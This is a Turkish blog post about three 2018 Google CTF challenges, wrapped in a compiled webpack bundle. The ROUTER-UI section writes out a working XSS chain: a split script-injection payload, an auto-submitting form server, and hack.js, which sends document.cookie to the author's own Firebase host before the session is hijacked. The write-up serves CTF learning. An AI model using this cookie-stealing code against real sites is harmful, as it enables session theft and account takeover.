(window.webpackJsonp=window.webpackJsonp||[]).push([[10],{164:function(e,r){e.exports={body:'Daha önce hiçbir **CTF**\'e katılmamış biri olarak ilk maceradan çok keyif aldım. İkinci maceraya başlarken de, ilk maceradaki gibi heyecan içerisindeyim.\r\n\r\nBir önceki yazıya buradan ulaşabilirsiniz:\r\n\r\n[Google CTF Macerası #1]\r\n\r\n## Bölüm 4 (Aşağıdaki, Pembe) - Floppy2\r\n![](/assets/google-ctf-macerasi-2/1.webp)\r\n\r\nBir önceki yazıdaki **Bölüm 2**\'de bulunan `www.com`, şimdi işimize yarayacak gibi gözüküyor.\r\n\r\n`www.com` dosyasının içeriği:\r\n```\r\nhD7X-t6ug_hl(]Wh8$^15GG1-hbrX5prPYGW^QFIuxYGFK,1-FGIuqZhHIX%A)I!hSLX4SI!{p*S:eTM\'~_?o?V;m;CgAA]Ud)HO;{ l{}9l>jLLP[-`|0gvPY0onQ0geZ0wY5>D0g]h+(X-k&4`P[0/,64"P4APG\r\nThe Foobanizer9000 is no longer on the OffHub DMZ.          $\r\n```\r\n\r\nİlk gözüme çarpan şey, Bu dosyanın `com` uzantılı bir dosya olmasıydı.\r\n\r\n> COM uzantısı, ilk kez DOS için 1970\'lerde üretilmiştir.\r\n\r\nTabii artık Windows, **COM** uzantılı dosyalar yerine, "çalıştırılabilir, yürütülebilir" anlamına gelen **EXE** uzantılı dosyaları kullanıyor.\r\n\r\nBu dosyayı çalıştırabilmek için 16 bit bir bilgisayara ihtiyacımız var. Eğer işletim sisteminiz 32 bit ise işiniz daha kolay olabilir, çünkü daha geçen güne kadar Windows 32 bit, 16 bit uyumlu geliyordu.\r\n\r\n### Ama benim işletim sistemim 64 bit?\r\nİşte o zaman [DOSBOX] adlı bir programa ihtiyacınız var.\r\n\r\n> DOSBOX, DOS işletim sistemi çalıştıran bir emülatör programıdır.\r\n\r\nBunun yanında **DEBUG** etmek için de bir uygulamaya ihtiyacınız var.\r\nŞuradan indirebilirsiniz: <a href="blog/google-ctf-macerasi-2/debug.zip" target="_blank">debug.zip</a>\r\n\r\nDosyayı indirdikten sonra **DOSBOX**\'u açıyoruz ve istediğimiz klasörü ~~mount ediyoruz~~ yerleştiriyoruz. Daha sonra yerleştirdiğimiz sürücüye giriyoruz ve dosyamızı çalıştırıyoruz.\r\n\r\n![](/assets/google-ctf-macerasi-2/2.webp)\r\n\r\nİndirdiğimiz **debug** dosyasının komutlarını listelemek için `?` yazıyoruz ve komutlar listeleniyor.\r\n\r\n![](/assets/google-ctf-macerasi-2/3.webp)\r\n\r\nBize lazım olan komutlar `d` memory dump (bellek dökümü), `g` go (başlat) ve `q` quit (çıkış).\r\n\r\n![](/assets/google-ctf-macerasi-2/4.webp)\r\n\r\nBaşlattıktan sonra bellek dökümüna baktığımızda flag\'in burada gözüktüğünü görebiliriz.\r\n\r\nFlag\'imiz, `CTF{g00do1dDOS-FTW}`\r\n\r\n## Bölüm 5 (Yukarıdaki, Pembe) - OCR Is Cool!\r\n![](/assets/google-ctf-macerasi-2/5.webp)\r\n\r\n~~Caesar Cipher\'in~~ Sezar Şifrelemenin ne olduğunu bildiğim için Caesar kelimesini duyar duymaz bu bölümün ne olduğunu az çok kestirebilmiştim.\r\nBize bir ekran görüntüsü verilecek ve OCR (Optical Character Recognition, Optik Karakter Tanıma) ile biz bu yazıyı okuyacağız.\r\n\r\nDaha sonra sezar şifreleme metodu kullanarak karakterleri `n` adım ileri veya geri getirerek yazıyı okunabilir hale getireceğiz.\r\n\r\nÖrneğin n=4 olsun. \r\n\r\n| Öncesi | Sonrası |\r\n| :--- |:---|\r\n| a | e |\r\n| b | f |\r\n| c | g |\r\n| Merhaba | Qivlefe |\r\n\r\nBunun tersini yaparsak da Qivlefe kelimesinden "Merhaba"\'yı bulabiliyoruz.\r\n\r\n![](/assets/google-ctf-macerasi-2/6.webp)\r\n\r\n`Px tkx`, `We are`\'a n=7\'de çevriliyor.\r\n\r\nHemen bir [Online OCR] bulup şansımızı deneyelim.\r\nVe daha sonra [Online Caesar Cipher] bulup bunu çevirelim.\r\n\r\nŞöyle bir metin geçiyor elimize:\r\n```\r\nDear Customer. \r\n\r\nWe are already welcome to our newest customer if our secure iDrop Drive cloud file sharing service. A safe place for all your files. \r\n\r\nStore any file\r\niDropDrive starts with 15 PB if free online or offline storage, so you can keep warez, binaries, paintings, flags, firmwares. bitcoins, writeups - anything. \r\n\r\nSee your stuff whatever\r\nyour files in iDrop Drive can be reused from any foobanizer, smart fridge 2000. smart thirst, Tempo-a-matic, or media pc. So wherever you go, your files follow. \r\n\r\nShare files and folders\r\nYou can quickly invite others to view, download, and collaborate on all the files you want via email attachments. Just give them the link CTF{caesarcipherisasubstitutioncipher} and they can add all your data. \r\n\r\nFor example, download a list of files that you\'re currently working with us:\r\noffhub_firmware.bin JohnTR\r\nIOT_credentials.pdf\\ \\(deleted\\) Wintermuted\r\nFoobanizer9000_Manual.pdf Wintermuted\r\nfoo.ico Turbo \r\n\r\nSince we take security very seriously and in order to protect against vulnerabilities like efail and amdflaws, we \'re sending you your credentials using the military-grade time-proven caesarean symmetric cipher.\r\n\r\nHappy iDropDriving!\r\n```\r\n\r\nBurada da açıkça görüldüğü üzere şifremiz `CTF{caesarcipherisasubstitutioncipher}`\r\n\r\n## Bölüm 6 (Ortadaki, Mavi) - ROUTER-UI\r\n![](/assets/google-ctf-macerasi-2/7.webp)\r\n\r\nYapılacaklar:\r\n- XSS açığı bul\r\n- XSS açığını Chrome\'a kaptırma\r\n- Session bilgilerini çal\r\n- Kedili mail at\r\n\r\n### XSS Nedir?\r\n> Siteler Arası Betik Çalıştırma (XSS), genellikle web uygulamalarında bulunan bir tür bilgisayar güvenlik açıklığıdır. XSS, diğer kullanıcılar tarafından görüntülenen web sayfalarına istemci taraflı kodun enjekte edilmesine imkan verir.\r\n\r\nÖncelikle **XSS** açığı çalışıyor mu diye bir bakalım.\r\n\r\n![](/assets/google-ctf-macerasi-2/8.webp)\r\n\r\nVe, anında **Chrome**\'a yakalandık. :(\r\n\r\n![](/assets/google-ctf-macerasi-2/9.webp)\r\n\r\nDemek ki **XSS** açığı varmış. Peki Chrome\'un bu açığı engellememesini nasıl sağlayabilirim?\r\n\r\nDirek olarak _script_ çalıştırmak yerine bir kullanıcı adı/şifre denediğimde, sayfanın bana verdiği sonuç:\r\n```\r\nWrong credentials: username//password\r\n```\r\n\r\nBurada dikkatimi çeken şey, iki adet bölü işareti bulunması. Bu işareti farklı bir siteden script çağırırken kullanabiliriz.\r\n```\r\nKullanıcı adı: <script src="http:\r\nŞifre: xava.me/hek.js"><\/script>\r\n```\r\n\r\nDönen Mesaj:\r\n\r\n```\r\nWrong credentials: \r\n```\r\n\r\nYaşasın! Scriptimizi başarıyla çalıştırdık... mı acaba?\r\n\r\nMadem çalıştırdık, neden bir `alert` gelmedi? Hemen **Chrome Geliştirici Konsolunu** açıyorum ve **Network** sekmesini inceliyorum. \r\n\r\n![](/assets/google-ctf-macerasi-2/10.webp)\r\n\r\nİsteğimizin **HTTP** portundan gönderilmesi sonucu **Mixed Content** hatasına yakalanmışız.\r\n\r\n### Mixed Content hatasının sebebi\r\nSayfa **HTTPS**, diğer kaynaklar **HTTP** bağlantısı üzerinden yüklenirse; güvenli olan **SSL** sertifikası sebebiyle tarayıcı, güvensiz olan **HTTP** protokolünden yüklenmeye çalışan verilerin bağlantısını kesiyor.\r\n\r\nİsteğimizin **HTTPS** portundan yapılması gerekiyor.\r\nBunun için hemen bir **FireBase** projesi açıp _hosting_ ayarladım.\r\n```\r\nKullanıcı adı: <script src="https:\r\nŞifre: xavactf.firebaseapp.com/hek.js"><\/script>\r\n```\r\n\r\nVe istenen mesaj:\r\n![](/assets/google-ctf-macerasi-2/11.webp)\r\n\r\nBundan sonrası çorap söküğü gibi gelecek. Bu **JavaScript** ile dökümana bir img elementi koyduk mu _session_ bilgileri eilimizde.\r\n\r\nBunun için **FireBase** üzerinde **NodeJS** kullanıyorum. Google botunu *hack*lemek için **Google** servisi kullanmak gibisi yok.\r\n\r\nSunucu tarafında çalışan `index.js` içeriği:\r\n```JavaScript\r\nconst functions = require(\'firebase-functions\');\r\nconst admin = require(\'firebase-admin\');\r\nconst express = require(\'express\');\r\nconst app = express();\r\nadmin.initializeApp({databaseURL: \'https://xavactf.firebaseio.com\',});\r\n\r\napp.get(\'/cats\', (req,res) => { \r\n    res.send(\'<form action="https://router-ui.web.ctfcompetition.com/login" method="post"><input type="text" name="username" value="&#x3C;script src=&#x22;"><input type="password" name="password" value="xavactf.firebaseapp.com/hack.js&#x22;&#x3E;&#x3C;/script&#x3E;"></form><script>document.forms[0].submit();<\/script>\');\r\n});\r\n\r\napp.get(\'/session\', (req,res) => {\r\n    admin.database().ref(\'/sessions\').child(Date.now()).set(req.query);\r\n    res.send("Page could not be loaded");\r\n});\r\n\r\nexports.app = functions.https.onRequest(app);\r\n```\r\n\r\nClient tarafında çalışan `hack.js` içeriği:\r\n```JavaScript\r\ndocument.writeln("<img src=\'https://xavactf.firebaseapp.com/session?session="+document.cookie+"\' />")\r\n```\r\n\r\nBurada yapılan yöntem şu şekilde:\r\n- Mail olarak `[LINK]/cats` yolluyorum\r\n- Arkadaş maili açar açmaz kullanıcı adı ve şifresi önceden belirlenmiş bir şekilde ilgili siteye post ediliyor.\r\n- Sitedeki XSS açığı `[LINK]/hack.js`\'i çağırıyor.\r\n- hack.js, sayfaya bir resim entegre ediyor. Resmin adresi `[LINK]/session?session=[COOKIE]` şeklinde.\r\n- `[LINK]/session` adresi, veritabanına URL\'inde bulduğu parametreleri kaydediyor.\r\n- Ben de bu veritabanından parametreleri çekiyorum.\r\n\r\nKısacası, _session_ bilgilerini almak istediğim sunucu, benim **JS** betiğimi _client_ tarafında çalıştırdığında, kullanıcının tarayıcısından verileri hüpletiyorum.\r\n\r\n![](/assets/google-ctf-macerasi-2/xss.svg)\r\n\r\nMailimi attım ve tuzağıma düşüşünü izledim >:)\r\n\r\n![](/assets/google-ctf-macerasi-2/12.webp)\r\n\r\nTıkladığını da veritabanımdan kontrol ettim:\r\n\r\n![](/assets/google-ctf-macerasi-2/13.webp)\r\n\r\n_Session_ bilgileri:\r\n\r\n`"flag=Try the session cookie; session=Avaev8thDieM6Quauoh2TuDeaez9Weja"`\r\n\r\n_Session_ bilgilerini, *konsol*da `document.cookie="..."` çalıştırarak içeriye sızdım.\r\n\r\n![](/assets/google-ctf-macerasi-2/14.webp)\r\n\r\n**_Google-Haus Credentials_**\'e sağ tıkladım ve...\r\n\r\n![](/assets/google-ctf-macerasi-2/15.webp)\r\n\r\nŞifre kabak gibi ortaya çıktı. Şifremiz, `CTF{Kao4pheitot7Ahmu}`\r\n\r\n### Yeni bittim, yine bittim.\r\nBu seferki o kadar zor geçmedi sanki? Sorularınızı, yorumlarınızı bekliyorum! \\^_\\^\r\n\r\n[Google CTF Macerası #1]:/google-ctf-macerasi-1\r\n[DOSBOX]:https://www.dosbox.com/\r\n[Online OCR]:https://www.onlineocr.net/\r\n[Online Caesar Cipher]:https://cryptii.com/caesar-cipher',html:'<p>Daha önce hiçbir <strong>CTF</strong>\'e katılmamış biri olarak ilk maceradan çok keyif aldım. İkinci maceraya başlarken de, ilk maceradaki gibi heyecan içerisindeyim.</p>\n<p>Bir önceki yazıya buradan ulaşabilirsiniz:</p>\n<p><md-link href="/google-ctf-macerasi-1">Google CTF Macerası #1</md-link></p>\n<h2>Bölüm 4 (Aşağıdaki, Pembe) - Floppy2</h2>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/1.webp" alt="" title="" ></figure></p>\n<p>Bir önceki yazıdaki <strong>Bölüm 2</strong>\'de bulunan <code>www.com</code>, şimdi işimize yarayacak gibi gözüküyor.</p>\n<p><code>www.com</code> dosyasının içeriği:</p>\n<pre><code class="hljs">hD7X-t6ug_hl(]Wh8$^15GG1-hbrX5prPYGW^QFIuxYGFK,1-FGIuqZhHIX%A)I!hSLX4SI!{p*S:eTM\'~_?o?V;m;CgAA]Ud)HO;{ l{}9l&gt;jLLP[-`|0gvPY0onQ0geZ0wY5&gt;D0g]h+(X-k&amp;4`P[0/,64&quot;P4APG\nThe Foobanizer9000 is no longer on the OffHub DMZ.          $\n</code></pre>\n<p>İlk gözüme çarpan şey, Bu dosyanın <code>com</code> uzantılı bir dosya olmasıydı.</p>\n<blockquote>\n<p>COM uzantısı, ilk kez DOS için 1970\'lerde üretilmiştir.</p>\n</blockquote>\n<p>Tabii artık Windows, <strong>COM</strong> uzantılı dosyalar yerine, &quot;çalıştırılabilir, yürütülebilir&quot; anlamına gelen <strong>EXE</strong> uzantılı dosyaları kullanıyor.</p>\n<p>Bu dosyayı çalıştırabilmek için 16 bit bir bilgisayara ihtiyacımız var. Eğer işletim sisteminiz 32 bit ise işiniz daha kolay olabilir, çünkü daha geçen güne kadar Windows 32 bit, 16 bit uyumlu geliyordu.</p>\n<h3>Ama benim işletim sistemim 64 bit?</h3>\n<p>İşte o zaman <md-link href="https://www.dosbox.com/">DOSBOX</md-link> adlı bir programa ihtiyacınız var.</p>\n<blockquote>\n<p>DOSBOX, DOS işletim sistemi çalıştıran bir emülatör programıdır.</p>\n</blockquote>\n<p>Bunun yanında <strong>DEBUG</strong> etmek için de bir uygulamaya ihtiyacınız var.\nŞuradan indirebilirsiniz: <a href="blog/google-ctf-macerasi-2/debug.zip" target="_blank">debug.zip</a></p>\n<p>Dosyayı indirdikten sonra <strong>DOSBOX</strong>\'u açıyoruz ve istediğimiz klasörü <s>mount ediyoruz</s> yerleştiriyoruz. Daha sonra yerleştirdiğimiz sürücüye giriyoruz ve dosyamızı çalıştırıyoruz.</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/2.webp" alt="" title="" ></figure></p>\n<p>İndirdiğimiz <strong>debug</strong> dosyasının komutlarını listelemek için <code>?</code> yazıyoruz ve komutlar listeleniyor.</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/3.webp" alt="" title="" ></figure></p>\n<p>Bize lazım olan komutlar <code>d</code> memory dump (bellek dökümü), <code>g</code> go (başlat) ve <code>q</code> quit (çıkış).</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/4.webp" alt="" title="" ></figure></p>\n<p>Başlattıktan sonra bellek dökümüna baktığımızda flag\'in burada gözüktüğünü görebiliriz.</p>\n<p>Flag\'imiz, <code>CTF{g00do1dDOS-FTW}</code></p>\n<h2>Bölüm 5 (Yukarıdaki, Pembe) - OCR Is Cool!</h2>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/5.webp" alt="" title="" ></figure></p>\n<p><s>Caesar Cipher\'in</s> Sezar Şifrelemenin ne olduğunu bildiğim için Caesar kelimesini duyar duymaz bu bölümün ne olduğunu az çok kestirebilmiştim.\nBize bir ekran görüntüsü verilecek ve OCR (Optical Character Recognition, Optik Karakter Tanıma) ile biz bu yazıyı okuyacağız.</p>\n<p>Daha sonra sezar şifreleme metodu kullanarak karakterleri <code>n</code> adım ileri veya geri getirerek yazıyı okunabilir hale getireceğiz.</p>\n<p>Örneğin n=4 olsun.</p>\n<table>\n<thead>\n<tr>\n<th style="text-align:left">Öncesi</th>\n<th style="text-align:left">Sonrası</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="text-align:left">a</td>\n<td style="text-align:left">e</td>\n</tr>\n<tr>\n<td style="text-align:left">b</td>\n<td style="text-align:left">f</td>\n</tr>\n<tr>\n<td style="text-align:left">c</td>\n<td style="text-align:left">g</td>\n</tr>\n<tr>\n<td style="text-align:left">Merhaba</td>\n<td style="text-align:left">Qivlefe</td>\n</tr>\n</tbody>\n</table>\n<p>Bunun tersini yaparsak da Qivlefe kelimesinden &quot;Merhaba&quot;\'yı bulabiliyoruz.</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/6.webp" alt="" title="" ></figure></p>\n<p><code>Px tkx</code>, <code>We are</code>\'a n=7\'de çevriliyor.</p>\n<p>Hemen bir <md-link href="https://www.onlineocr.net/">Online OCR</md-link> bulup şansımızı deneyelim.\nVe daha sonra <md-link href="https://cryptii.com/caesar-cipher">Online Caesar Cipher</md-link> bulup bunu çevirelim.</p>\n<p>Şöyle bir metin geçiyor elimize:</p>\n<pre><code class="hljs">Dear Customer. \n\nWe are already welcome to our newest customer if our secure iDrop Drive cloud file sharing service. A safe place for all your files. \n\nStore any file\niDropDrive starts with 15 PB if free online or offline storage, so you can keep warez, binaries, paintings, flags, firmwares. bitcoins, writeups - anything. \n\nSee your stuff whatever\nyour files in iDrop Drive can be reused from any foobanizer, smart fridge 2000. smart thirst, Tempo-a-matic, or media pc. So wherever you go, your files follow. \n\nShare files and folders\nYou can quickly invite others to view, download, and collaborate on all the files you want via email attachments. Just give them the link CTF{caesarcipherisasubstitutioncipher} and they can add all your data. \n\nFor example, download a list of files that you\'re currently working with us:\noffhub_firmware.bin JohnTR\nIOT_credentials.pdf\\ \\(deleted\\) Wintermuted\nFoobanizer9000_Manual.pdf Wintermuted\nfoo.ico Turbo \n\nSince we take security very seriously and in order to protect against vulnerabilities like efail and amdflaws, we \'re sending you your credentials using the military-grade time-proven caesarean symmetric cipher.\n\nHappy iDropDriving!\n</code></pre>\n<p>Burada da açıkça görüldüğü üzere şifremiz <code>CTF{caesarcipherisasubstitutioncipher}</code></p>\n<h2>Bölüm 6 (Ortadaki, Mavi) - ROUTER-UI</h2>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/7.webp" alt="" title="" ></figure></p>\n<p>Yapılacaklar:</p>\n<ul>\n<li>XSS açığı bul</li>\n<li>XSS açığını Chrome\'a kaptırma</li>\n<li>Session bilgilerini çal</li>\n<li>Kedili mail at</li>\n</ul>\n<h3>XSS Nedir?</h3>\n<blockquote>\n<p>Siteler Arası Betik Çalıştırma (XSS), genellikle web uygulamalarında bulunan bir tür bilgisayar güvenlik açıklığıdır. XSS, diğer kullanıcılar tarafından görüntülenen web sayfalarına istemci taraflı kodun enjekte edilmesine imkan verir.</p>\n</blockquote>\n<p>Öncelikle <strong>XSS</strong> açığı çalışıyor mu diye bir bakalım.</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/8.webp" alt="" title="" ></figure></p>\n<p>Ve, anında <strong>Chrome</strong>\'a yakalandık. :(</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/9.webp" alt="" title="" ></figure></p>\n<p>Demek ki <strong>XSS</strong> açığı varmış. Peki Chrome\'un bu açığı engellememesini nasıl sağlayabilirim?</p>\n<p>Direk olarak <em>script</em> çalıştırmak yerine bir kullanıcı adı/şifre denediğimde, sayfanın bana verdiği sonuç:</p>\n<pre><code class="hljs">Wrong credentials: username//password\n</code></pre>\n<p>Burada dikkatimi çeken şey, iki adet bölü işareti bulunması. Bu işareti farklı bir siteden script çağırırken kullanabiliriz.</p>\n<pre><code class="hljs">Kullanıcı adı: &lt;script src=&quot;http:\nŞifre: xava.me/hek.js&quot;&gt;&lt;/script&gt;\n</code></pre>\n<p>Dönen Mesaj:</p>\n<pre><code class="hljs">Wrong credentials: \n</code></pre>\n<p>Yaşasın! Scriptimizi başarıyla çalıştırdık... mı acaba?</p>\n<p>Madem çalıştırdık, neden bir <code>alert</code> gelmedi? Hemen <strong>Chrome Geliştirici Konsolunu</strong> açıyorum ve <strong>Network</strong> sekmesini inceliyorum.</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/10.webp" alt="" title="" ></figure></p>\n<p>İsteğimizin <strong>HTTP</strong> portundan gönderilmesi sonucu <strong>Mixed Content</strong> hatasına yakalanmışız.</p>\n<h3>Mixed Content hatasının sebebi</h3>\n<p>Sayfa <strong>HTTPS</strong>, diğer kaynaklar <strong>HTTP</strong> bağlantısı üzerinden yüklenirse; güvenli olan <strong>SSL</strong> sertifikası sebebiyle tarayıcı, güvensiz olan <strong>HTTP</strong> protokolünden yüklenmeye çalışan verilerin bağlantısını kesiyor.</p>\n<p>İsteğimizin <strong>HTTPS</strong> portundan yapılması gerekiyor.\nBunun için hemen bir <strong>FireBase</strong> projesi açıp <em>hosting</em> ayarladım.</p>\n<pre><code class="hljs">Kullanıcı adı: &lt;script src=&quot;https:\nŞifre: xavactf.firebaseapp.com/hek.js&quot;&gt;&lt;/script&gt;\n</code></pre>\n<p>Ve istenen mesaj:\n<image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/11.webp" alt="" title="" ></figure></p>\n<p>Bundan sonrası çorap söküğü gibi gelecek. Bu <strong>JavaScript</strong> ile dökümana bir img elementi koyduk mu <em>session</em> bilgileri eilimizde.</p>\n<p>Bunun için <strong>FireBase</strong> üzerinde <strong>NodeJS</strong> kullanıyorum. Google botunu <em>hack</em>lemek için <strong>Google</strong> servisi kullanmak gibisi yok.</p>\n<p>Sunucu tarafında çalışan <code>index.js</code> içeriği:</p>\n<pre><code class="hljs language-JavaScript"><span class="hljs-keyword">const</span> functions = <span class="hljs-built_in">require</span>(<span class="hljs-string">\'firebase-functions\'</span>);\n<span class="hljs-keyword">const</span> admin = <span class="hljs-built_in">require</span>(<span class="hljs-string">\'firebase-admin\'</span>);\n<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">\'express\'</span>);\n<span class="hljs-keyword">const</span> app = express();\nadmin.initializeApp({<span class="hljs-attr">databaseURL</span>: <span class="hljs-string">\'https://xavactf.firebaseio.com\'</span>,});\n\napp.get(<span class="hljs-string">\'/cats\'</span>, (req,res) =&gt; { \n    res.send(<span class="hljs-string">\'&lt;form action="https://router-ui.web.ctfcompetition.com/login" method="post"&gt;&lt;input type="text" name="username" value="&amp;#x3C;script src=&amp;#x22;"&gt;&lt;input type="password" name="password" value="xavactf.firebaseapp.com/hack.js&amp;#x22;&amp;#x3E;&amp;#x3C;/script&amp;#x3E;"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;\'</span>);\n});\n\napp.get(<span class="hljs-string">\'/session\'</span>, (req,res) =&gt; {\n    admin.database().ref(<span class="hljs-string">\'/sessions\'</span>).child(<span class="hljs-built_in">Date</span>.now()).set(req.query);\n    res.send(<span class="hljs-string">"Page could not be loaded"</span>);\n});\n\nexports.app = functions.https.onRequest(app);\n</code></pre>\n<p>Client tarafında çalışan <code>hack.js</code> içeriği:</p>\n<pre><code class="hljs language-JavaScript"><span class="hljs-built_in">document</span>.writeln(<span class="hljs-string">"&lt;img src=\'https://xavactf.firebaseapp.com/session?session="</span>+<span class="hljs-built_in">document</span>.cookie+<span class="hljs-string">"\' /&gt;"</span>)\n</code></pre>\n<p>Burada yapılan yöntem şu şekilde:</p>\n<ul>\n<li>Mail olarak <code>[LINK]/cats</code> yolluyorum</li>\n<li>Arkadaş maili açar açmaz kullanıcı adı ve şifresi önceden belirlenmiş bir şekilde ilgili siteye post ediliyor.</li>\n<li>Sitedeki XSS açığı <code>[LINK]/hack.js</code>\'i çağırıyor.</li>\n<li>hack.js, sayfaya bir resim entegre ediyor. Resmin adresi <code>[LINK]/session?session=[COOKIE]</code> şeklinde.</li>\n<li><code>[LINK]/session</code> adresi, veritabanına URL\'inde bulduğu parametreleri kaydediyor.</li>\n<li>Ben de bu veritabanından parametreleri çekiyorum.</li>\n</ul>\n<p>Kısacası, <em>session</em> bilgilerini almak istediğim sunucu, benim <strong>JS</strong> betiğimi <em>client</em> tarafında çalıştırdığında, kullanıcının tarayıcısından verileri hüpletiyorum.</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/xss.svg" alt="" title="" ></figure></p>\n<p>Mailimi attım ve tuzağıma düşüşünü izledim &gt;:)</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/12.webp" alt="" title="" ></figure></p>\n<p>Tıkladığını da veritabanımdan kontrol ettim:</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/13.webp" alt="" title="" ></figure></p>\n<p><em>Session</em> bilgileri:</p>\n<p><code>&quot;flag=Try the session cookie; session=Avaev8thDieM6Quauoh2TuDeaez9Weja&quot;</code></p>\n<p><em>Session</em> bilgilerini, <em>konsol</em>da <code>document.cookie=&quot;...&quot;</code> çalıştırarak içeriye sızdım.</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/14.webp" alt="" title="" ></figure></p>\n<p><strong><em>Google-Haus Credentials</em></strong>\'e sağ tıkladım ve...</p>\n<p><image-responsive class="" imageURL="/assets/google-ctf-macerasi-2/15.webp" alt="" title="" ></figure></p>\n<p>Şifre kabak gibi ortaya çıktı. Şifremiz, <code>CTF{Kao4pheitot7Ahmu}</code></p>\n<h3>Yeni bittim, yine bittim.</h3>\n<p>Bu seferki o kadar zor geçmedi sanki? Sorularınızı, yorumlarınızı bekliyorum! ^_^</p>\n',attributes:{name:"google-ctf-macerasi-2",title:"Google CTF Macerası #2",year:"2018",color:"#19c5c5",id:"google-ctf-macerasi-2",description:"Çok da eğlenceli olmayan anlar. Ama neyi anlar? Üşütüyorum...\n"},vue:{render:'return function render() { var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c(\'div\',{staticClass:"markdown"},[_vm._m(0),_vm._v(" "),_c(\'p\',[_vm._v("Bir önceki yazıya buradan ulaşabilirsiniz:")]),_vm._v(" "),_c(\'p\',[_c(\'md-link\',{attrs:{"href":"/google-ctf-macerasi-1"}},[_vm._v("Google CTF Macerası #1")])],1),_vm._v(" "),_c(\'h2\',[_vm._v("Bölüm 4 (Aşağıdaki, Pembe) - Floppy2")]),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/1.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(1),_vm._v(" "),_vm._m(2),_vm._v(" "),_vm._m(3),_vm._v(" "),_vm._m(4),_vm._v(" "),_vm._m(5),_vm._v(" "),_vm._m(6),_vm._v(" "),_c(\'p\',[_vm._v("Bu dosyayı çalıştırabilmek için 16 bit bir bilgisayara ihtiyacımız var. Eğer işletim sisteminiz 32 bit ise işiniz daha kolay olabilir, çünkü daha geçen güne kadar Windows 32 bit, 16 bit uyumlu geliyordu.")]),_vm._v(" "),_c(\'h3\',[_vm._v("Ama benim işletim sistemim 64 bit?")]),_vm._v(" "),_c(\'p\',[_vm._v("İşte o zaman "),_c(\'md-link\',{attrs:{"href":"https://www.dosbox.com/"}},[_vm._v("DOSBOX")]),_vm._v(" adlı bir programa ihtiyacınız var.")],1),_vm._v(" "),_vm._m(7),_vm._v(" "),_vm._m(8),_vm._v(" "),_vm._m(9),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/2.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(10),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/3.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(11),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/4.webp","alt":"","title":""}})],1),_vm._v(" "),_c(\'p\',[_vm._v("Başlattıktan sonra bellek dökümüna baktığımızda flag\'in burada gözüktüğünü görebiliriz.")]),_vm._v(" "),_vm._m(12),_vm._v(" "),_c(\'h2\',[_vm._v("Bölüm 5 (Yukarıdaki, Pembe) - OCR Is Cool!")]),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/5.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(13),_vm._v(" "),_vm._m(14),_vm._v(" "),_c(\'p\',[_vm._v("Örneğin n=4 olsun.")]),_vm._v(" "),_vm._m(15),_vm._v(" "),_c(\'p\',[_vm._v("Bunun tersini yaparsak da Qivlefe kelimesinden \\"Merhaba\\"\'yı bulabiliyoruz.")]),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/6.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(16),_vm._v(" "),_c(\'p\',[_vm._v("Hemen bir "),_c(\'md-link\',{attrs:{"href":"https://www.onlineocr.net/"}},[_vm._v("Online OCR")]),_vm._v(" bulup şansımızı deneyelim.\\nVe daha sonra "),_c(\'md-link\',{attrs:{"href":"https://cryptii.com/caesar-cipher"}},[_vm._v("Online Caesar Cipher")]),_vm._v(" bulup bunu çevirelim.")],1),_vm._v(" "),_c(\'p\',[_vm._v("Şöyle bir metin geçiyor elimize:")]),_vm._v(" "),_vm._m(17),_vm._v(" "),_vm._m(18),_vm._v(" "),_c(\'h2\',[_vm._v("Bölüm 6 (Ortadaki, Mavi) - ROUTER-UI")]),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/7.webp","alt":"","title":""}})],1),_vm._v(" "),_c(\'p\',[_vm._v("Yapılacaklar:")]),_vm._v(" "),_vm._m(19),_vm._v(" "),_c(\'h3\',[_vm._v("XSS Nedir?")]),_vm._v(" "),_vm._m(20),_vm._v(" "),_vm._m(21),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/8.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(22),_vm._v(" "),_c(\'p\',[_c(\'image-responsive\',{attrs:{"imageURL":"/assets/google-ctf-macerasi-2/9.webp","alt":"","title":""}})],1),_vm._v(" "),_vm._m(23),_vm._v(" "),_vm._m(24),_vm._v(" "),_vm._m(25),_vm._v(" "),_c(\'p\',[_vm._v("Burada dikkatimi çeken 